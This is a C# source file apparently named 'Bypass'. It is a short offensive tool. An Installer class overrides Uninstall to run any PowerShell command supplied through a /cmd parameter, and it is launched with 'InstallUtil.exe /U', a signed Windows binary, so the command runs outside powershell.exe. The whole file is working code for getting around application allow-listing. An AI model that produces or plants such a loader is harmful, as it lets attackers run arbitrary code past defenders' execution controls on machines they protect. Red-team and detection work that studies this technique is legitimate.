using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.Remoting.Contexts;
using System.Xml.Linq;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Usage: InstallUtil.exe /U /cmd:\"whoami\" /output sar.exe");
            Console.WriteLine("/cmd:\"your command here\"");
            Console.WriteLine("/output - if you want to see the output");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // Retrieve the cmd parameter from the install context
            String cmd = Context.Parameters["cmd"];
            Console.WriteLine("Command: " + cmd);

            // Retrieve the optional output parameter
            bool showOutput = Context.Parameters.ContainsKey("output");

            // Ensure the cmd parameter is not null or empty before executing
            if (!string.IsNullOrEmpty(cmd))
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                ps.AddScript(cmd);

                // Invoke and capture output if the output parameter is provided
                if (showOutput)
                {
                    foreach (PSObject result in ps.Invoke())
                    {
                        Console.WriteLine(result.ToString());
                    }
                }
                else
                {
                    ps.Invoke();
                }

                rs.Close();
            }
            else
            {
                // Display an error message if the cmd parameter is missing
                Console.Error.WriteLine("Error: No command provided. Use /cmd:\"your command here\"");
            }
        }
    }
}